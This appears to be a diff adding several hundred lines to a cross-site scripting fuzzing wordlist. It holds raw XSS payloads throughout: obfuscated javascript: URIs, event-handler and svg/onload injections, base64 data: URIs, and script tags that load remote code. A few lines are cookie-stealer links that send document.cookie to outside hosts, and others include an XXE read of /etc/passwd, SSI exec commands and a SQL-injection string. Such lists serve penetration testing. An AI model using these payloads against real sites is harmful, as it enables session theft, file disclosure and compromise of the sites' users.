+&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
+&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<svg xmlns="http://www.w3.org/2000/svg"><a id="x"><rect fill="white" width="1000" height="1000"/></a><rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/></svg>
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
+document.
+&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+\u003C
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+%u22%u27%u3e%u3cscript%u3econfirm(42)%u3c/script%u3e
+javascript:prompt(42)
+title=
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
+&#x003c;
+<input type="image" dynsrc="javascript:document.vulnerable=true;">
+LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
+<![CDATA[ complete cdata ]]>
+<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
+<body onclick=print()>
+&#x27E8;script&#x27E9;
+document
+<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<A href="javascript%26colon;confirm()">click
+<!-- open comment
+<? echo('<SCR)';
+<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
+SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<body onmessage=print()>
+"title=
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+<x on%78xx=1
+<x 1='1'onxxx=1
+<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;
+cookie
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
+<x%0Conxxx=1
+<body style="background-color:red !important;">
+<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
+<;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>;
+setInterval`alert\x28document.domain\x29`
+<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<input onfocus=write(XSS) autofocus>
+&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
+&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
+<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
+style=
+a="get";
+<XSS STYLE="behavior: url(%(htc)s);">
+<x </onxxx=1
+<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
+&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
+<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<svg onload=alert&lpar;1&rpar;>
+&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<;? echo(';<;SCR)';;
+&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;
+"><iframe src='https://testforiframe.site/'>
+g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
+<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
+<body onmouseover="print()">
+<iframe src="https://crowdshield.com/.testing/iframe_injection.php?iframe_src=4" height="100%" width="100%"></iframe>//INJECTX
+<HTML><BODY>
+<;HTML>;<;BODY>;
+&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
+left:\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF14\uFF12\u1450
+"
+"><h1><iframe width="420" height="315" src="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1>
+1script3document.vulnerable=true;1/script3
+(alert)(1)
+Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
+<;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";>;
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
+<object data=javascript:window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
+<head></head><body>padding<bleh onclick="top[/al/.source+/ert/.source]	``">clickpadding</bleh></body>
+<link rel=attachment href="file:///etc/passwd">
+prompt("test")
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+&lt;? echo('&lt;SCR)';
+<img LOWSRC="javascript:document.vulnerable=true;">
+"onclick
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<img src="https://i.imgur.com/bYmdHcX.gif"></img>
+"href=
+<STYLE>@import'%(css)s';</STYLE>
+<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<x/onmouSeenter=window[`\x61\x6c\x65\x72\x74`]`1337`
+prompt(123)
+&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<svG/x=">"/oNloaD=confirm()//
+<object data="data:text/html;base64,%(base64)s">
+<svg/ \/\/%20%20%20%20%20onload%20%20%20%20%20 =%20%20%20%20%20%20%20 window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
+<input onblur=write(XSS) autofocus><input autofocus>
+%u0022%u0027%u003e%u003cscript%u003econfirm(42)%u003c/script%u003e
+<D3"<"/OncLick="1>[confirm``]"<">z
+<input value=<><iframe/src=javascript:confirm(1)
+')
+[1].find(alert)
+&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
+onclick
+&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
+<Input value = "XSS" type = text>
+<x%0Donxxx=1
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+&#X000003C
+https://brutelogic.com.br/poc.svg
+<;LAYER SRC=";http://ha.ckers.org/scriptlet.html";>;<;/LAYER>;
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+]]><![CDATA[ close/complete cdata ]]>
+"onload
+top
+<svg onload=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='));>
+<pre id=p style=background:#000><svg onload='setInterval(n=>{for(o=t++,i=476;i--;o+=i%30?("0o"[c=0|(h=v=>(M=Math).hypot(i/30-8+3*M.sin(t/8/v),i%30/2-7+4*M.cos(t/9/v)))(7)*h(9)*h(6)/32]||".").fontcolor(c>2):"\n");p.innerHTML=o},t=1)'>
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+&#X03c;
+&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
+")
+<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
 &lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
+&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;
+<IMG SRC="livescript:[code]">
+';a=prompt,a()//
+<A HREF="http://1113982867/">XSS</A>
+--><!-- close/complete comment -->
+<!-- INJECTX
+&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
+<;IMG SRC=";livescript:[code]";>;
+data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
+<img SRC="jav ascript:document.vulnerable=true;">
+&#x0003c;
+<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
+<XSS STYLE="behavior: url(xss.htc);">
+<;A HREF=";//google";>;XSS<;/A>;
+onmouseover=\u0061\u006C\u0065\u0072\u0074('XSS')
+src="http://www.site.com/XSS.js"></script>
+<svg%0Aonload=%09((pro\u006dpt))()//
+&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
+<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
+alert&#x28;1&#x29
+confirm("test")
+><object+data=//14.rs>
+&#x00003C;
+<a href=
+On Mouse Over​
+<body BACKGROUND="javascript:document.vulnerable=true;">
+<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
+<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">
+" value=``
+%252522%252527%25253e%25253cscript%25253econfirm(42)%25253c/script%25253e
+<a onclick="javascript:document.location='http://sn1persecurity.com/.testing/iframe_injection.php?cookie='+document.cookie;">INJECTX COOKIE STEALER!</a>
+top['al\145rt'](1)
+&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
+confirm(document.domain)
+<?xml
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
+&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
+<svg
+&#x3c
+onmouseover="document.cookie=true;">//INJECTX
+&#x2329;script&#x232A;
+confirm(123)
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+<;IMG SRC=";mocha:[code]";>;
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+onmouseover
+onerror
+&#x000003c;
+<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');"><h1>Drop me</h1></div><iframe src="http://www.example.org/dropHere.html"></iframe>
+&#x0003C;
+<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;
+href="data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAOwBoAGkAcwB0AG8AcgB5AC4AYgBhAGMAawAoACkAOwA8AC8AcwBjAHIAaQBwAHQAPgAKADwAcwBjAHIAaQBwAHQAPgBjAG8AbgBmAGkAcgBtACgANAAyACkAOwA8AC8AcwBjAHIAaQBwAHQAPg-"	UTF-7 (all)
+'-confirm`1`-'
+&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
+&#60
+&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
+<div style="background-image: url(javascript:document.vulnerable=true;);">
+jAvasCript:confirm(42)
+&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<div style="font-family:'foo&#10;;color:red;';">XXX
+&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
+<a onclick="javascript:document.location='https://crowdshield.com/.testing/iframe_injection.php?cookie='+document.cookie;">INJECTX COOKIE STEALER!</a>
+jAvas/* */Cript:confirm(42)
+&#X3C;
+&#X0003C;
+eval(a+b+c+d);
+<;DIV STYLE=";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029";>;
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
+<;A HREF=";http://www.google.com./";>;XSS<;/A>;
+<img src=&{document.vulnerable=true;};>
+&{document.vulnerable=true;};
+<table><TD BACKGROUND="javascript:document.vulnerable=true;">
+&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;
+&lt;HTML xmlns:xss&gt;
+&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
+<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
+<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
+'>><marquee><h1>XSS</h1></marquee>
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
+\74svg o\156load\75alert\501\51\76
+"><object+data=javascript%26%63%6f%6c%6f%6e%3b'straccessng'.replace('access',alert)>
+&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
+<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
+"onclick=prompt(8)>"@x.y
+<img src="http://sn1persecurity.com/.testing/xss.png?img_src=2"></img>//INJECTX
+&#X3c;
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+'">><marquee><h1>XSS</h1></marquee>
+.cookie
+<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>;
+<;HTML xmlns:xss>;
+<var onmouseover="prompt(1)">On Mouse Over</var>?
+'-document.write`<h1>juniorEXPLOIT</h1>`-'
+&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
+&#00060
+<XSS STYLE="xss:expression(document.vulnerable=true)">
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
+&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
+<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
+<div onmouseover="document.vulnerable=true;">
+<index
+<iframe  src="&Tab;javascript:prompt(1)&Tab;">
+&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
+<svg%0Aonauxclick=0;[1].some(confirm)//
+exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
+<iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" frameborder="0" allowfullscreen></iframe>
+<img src="blah"onmouseover="document.vulnerable=true;">
+&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
+<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<details/open/ontoggle="alert`1`">
+top['al\x65rt'](1)
+<div style="binding: url([link to code]);">
+setTimeout`alert\x28document.domain\x29`
+&#X3C
+<img src="http://38.media.tumblr.com/tumblr_m5who6JOEM1rna86e.gif"></img>
+javascript:prompt(document.cookie)
+<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+"o<x>nmouseover=alert<x>(1)//
+"'%25u003e%25u003cscript%25u003econfirm(42)%25u003c/script%25u003e
+<svg onpointerenter=z=alert,z(document.domain)>
+</body>
+<svg><use xlink:href=data:image/svg%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x>
+<X OnXxx=1
+<x/onxxx=1
+%u00ABscript%u00BB
+<body onload="document.vulnerable=true;">
+http://xss.rocks/scriptlet.html
+// INJECTX
+<svg onload\r\n=$.globalEval("al"+"ert()");>
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<;A HREF=";http://google.com/";>;XSS<;/A>;
+{1==1}"><object+data=javascript%26colon%3b'str1ng'.replace('1',alert)>
+"link=
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<x%2Fonxxx=1
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
+exp/*<A STYLE='no\xss:noxss("*//*");
+<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
+&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<bgsound src="javascript:document.vulnerable=true;">
+alt=
+top.open`javas\cript:al\ert(1)`
+<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
+PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYCA8IS0tPg==
+<iframe src='https://testforiframe.site/'>
+<div STYLE="width: expression(document.vulnerable=true);">
+<IMG SRC='vbscript:msgbox("XSS")'>
+&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
+<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
+'<'/'><'s't'y'l'e'/'o'n'l'o'a'd'='a'l'e'r't('1')'>
+data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
+<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
+<x onxxx=1 onxxx=1
+")>
+<style type="text/javascript">document.vulnerable=true;</style>
+<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
+<img SRC="javascript:document.vulnerable=true;"
+<iframe src="http://sn1persecurity.com/.testing/iframe_injection.php?iframe_src=3" height="100%" width="100%"></iframe>//INJECTX
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
+&#X00003C;
+<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
+location.href=
+&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
+<;SCRIPT SRC=http://ha.ckers.org/xss.js
+'>
+\u003c
+\x3C
+INJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+<iframe src=http://xss.rocks/scriptlet.html <
+&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
+<a href="javascript:
